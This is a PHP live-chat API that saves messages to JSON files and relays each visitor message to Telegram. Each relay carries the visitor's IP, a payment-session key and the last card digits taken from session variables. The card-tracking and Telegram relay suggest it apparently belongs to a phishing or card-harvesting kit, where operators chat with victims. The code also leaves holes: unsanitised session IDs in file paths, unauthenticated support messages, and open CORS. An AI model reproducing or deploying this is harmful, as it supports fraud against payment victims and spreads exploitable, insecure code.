<?php
// ===== Create: /static/chat-api.php =====
// Separate chat API to avoid conflicts with existing api-v1.php
// Add this debugging block at the very top
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);
ini_set('error_log', 'chat_api_errors.log');

// Log all incoming requests
$input = file_get_contents('php://input');
error_log("Chat API called with input: " . $input);
error_log("Request method: " . $_SERVER['REQUEST_METHOD']);

use bot\lib\Telegram;

session_start();
include("../bot/conf.php");
include('../bot/lib/Telegram.php');

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// Ensure chat directory exists
if (!file_exists('../bot/chat_data/')) {
    mkdir('../bot/chat_data/', 0755, true);
}

function getIp()
{
    $keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            $parts = explode(',', $_SERVER[$key]);
            $ip = trim(end($parts));
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    return '127.0.0.1';
}

function generateSessionId()
{
    // Use existing session key if available (from payment flow)
    if (isset($_SESSION['key'])) {
        return 'chat_' . $_SESSION['key'];
    }
    return 'chat_' . md5(uniqid() . time() . getIp());
}

function getChatFile($sessionId)
{
    return "../bot/chat_data/{$sessionId}.json";
}

function loadChatData($sessionId)
{
    $file = getChatFile($sessionId);
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
        return $data ?: ['messages' => [], 'created' => time()];
    }
    return ['messages' => [], 'created' => time()];
}

function saveChatData($sessionId, $data)
{
    $file = getChatFile($sessionId);
    return file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
}

function sendToTelegram($sessionId, $message)
{
    global $BOT_TOKEN, $TP_CHAT;
    $telegram = new Telegram($BOT_TOKEN);

    $ip = getIp();
    $pageInfo = $_SESSION['current_page'] ?? 'Unknown';

    // Get session info if available
    $sessionInfo = "";
    if (isset($_SESSION['key'])) {
        $sessionInfo .= "*Payment Session:* `{$_SESSION['key']}`\n";
    }
    if (isset($_SESSION['crdn_temp'])) {
        $sessionInfo .= "*Card:* `****" . substr($_SESSION['crdn_temp'], -4) . "`\n";
    }
    if (isset($_SESSION['crdn'])) {
        $sessionInfo .= "*Card:* `****" . substr($_SESSION['crdn'], -4) . "`\n";
    }

    $chatMessage = "💬 *New Chat Message*\n\n";
    $chatMessage .= "*Page:* `{$pageInfo}`\n";
    $chatMessage .= "*Session:* `{$sessionId}`\n";
    if ($sessionInfo) {
        $chatMessage .= $sessionInfo;
    }
    $chatMessage .= "*Message:* {$message}\n\n";
    $chatMessage .= "*IP:* `{$ip}`\n";
    $chatMessage .= "*Time:* " . date('Y-m-d H:i:s');

    foreach ($TP_CHAT as $chatId) {
        $content = [
            'chat_id' => $chatId,
            'parse_mode' => 'Markdown',
            'text' => $chatMessage,
        ];

        try {
            $telegram->sendMessage($content);
        } catch (Exception $e) {
            error_log("Failed to send to Telegram: " . $e->getMessage());
        }
    }
}

function addMessage($sessionId, $message, $sender = 'user')
{
    $data = loadChatData($sessionId);

    $newMessage = [
        'id' => time() . rand(1000, 9999),
        'message' => $message,
        'sender' => $sender,
        'timestamp' => time(),
        'date_formatted' => date('Y-m-d H:i:s')
    ];

    $data['messages'][] = $newMessage;
    $data['last_activity'] = time();

    saveChatData($sessionId, $data);
    return $newMessage;
}

// Parse request
$input = file_get_contents('php://input');
$request = json_decode($input, true);

if (!$request || !isset($request['action'])) {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
    exit;
}

$action = $request['action'];

switch ($action) {
    case 'init_session':
        $sessionId = $_SESSION['chat_session_id'] ?? null;

        if (!$sessionId || !file_exists(getChatFile($sessionId))) {
            $sessionId = generateSessionId();
            $_SESSION['chat_session_id'] = $sessionId;

            $chatData = [
                'messages' => [],
                'created' => time(),
                'ip' => getIp(),
                'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
                'page' => $_SESSION['current_page'] ?? 'index'
            ];
            saveChatData($sessionId, $chatData);
        }

        $chatData = loadChatData($sessionId);
        $lastMessageId = 0;
        if (!empty($chatData['messages'])) {
            $lastMessage = end($chatData['messages']);
            $lastMessageId = $lastMessage['id'];
        }

        echo json_encode([
            'status' => 'success',
            'session_id' => $sessionId,
            'last_message_id' => $lastMessageId
        ]);
        break;

    case 'get_history':
        $sessionId = $request['session_id'] ?? '';
        if (!$sessionId) {
            echo json_encode(['status' => 'error', 'message' => 'Session ID required']);
            break;
        }

        $chatData = loadChatData($sessionId);
        echo json_encode([
            'status' => 'success',
            'messages' => $chatData['messages']
        ]);
        break;

    case 'send_message':
        $sessionId = $request['session_id'] ?? '';
        $message = trim($request['message'] ?? '');
        $sender = $request['sender'] ?? 'user';

        if (!$sessionId || !$message) {
            echo json_encode(['status' => 'error', 'message' => 'Session ID and message required']);
            break;
        }

        $newMessage = addMessage($sessionId, $message, $sender);

        if ($sender === 'user') {
            sendToTelegram($sessionId, $message);
        }

        echo json_encode([
            'status' => 'success',
            'message_id' => $newMessage['id']
        ]);
        break;

    case 'poll_messages':
        $sessionId = $request['session_id'] ?? '';
        $lastMessageId = $request['last_message_id'] ?? 0;

        if (!$sessionId) {
            echo json_encode(['status' => 'error', 'message' => 'Session ID required']);
            break;
        }

        $chatData = loadChatData($sessionId);
        $newMessages = [];

        foreach ($chatData['messages'] as $message) {
            if ($message['id'] > $lastMessageId) {
                $newMessages[] = $message;
            }
        }

        echo json_encode([
            'status' => 'success',
            'messages' => $newMessages
        ]);
        break;

    case 'add_support_message':
        $sessionId = $request['session_id'] ?? '';
        $message = trim($request['message'] ?? '');

        if (!$sessionId || !$message) {
            echo json_encode(['status' => 'error', 'message' => 'Session ID and message required']);
            break;
        }

        $newMessage = addMessage($sessionId, $message, 'support');

        echo json_encode([
            'status' => 'success',
            'message_id' => $newMessage['id']
        ]);
        break;

    default:
        echo json_encode(['status' => 'error', 'message' => 'Unknown action']);
}